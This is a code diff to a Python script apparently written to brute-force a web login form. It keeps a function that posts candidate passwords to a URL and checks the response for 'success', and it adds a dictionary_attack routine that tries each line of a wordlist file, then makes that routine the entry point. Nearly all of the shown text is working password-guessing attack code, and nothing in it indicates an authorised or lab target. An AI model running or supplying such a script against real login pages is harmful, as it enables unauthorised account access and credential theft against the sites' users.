@@ -29,7 +29,7 @@ def try_password(trial=[]):
     ' Send POST request attempt with password '
     try:
         data['password'] = ''.join(trial)
-        print('Try:', data['password'])
+        print('try:', data['password'])
         res = sess.post(url, data=data)
         if 'success' in res.text:  # if brute-force successful
             return 'Success'
@@ -53,5 +53,17 @@ def main():
         time.sleep(1)  # wait for 1 second before next attempt
 
 
+def dictionary_attack():
+    with open('dictionary.txt') as file:
+        for password in file: 
+            password = password.replace('\n', '')
+            res = try_password(password)
+            if res:  # if there is response, stop attack
+                print(res)
+                break
+            time.sleep(1)  # wait for 1 second before next attempt
+
+
 if __name__ == '__main__':
-    main()
+    # main()
+    dictionary_attack()
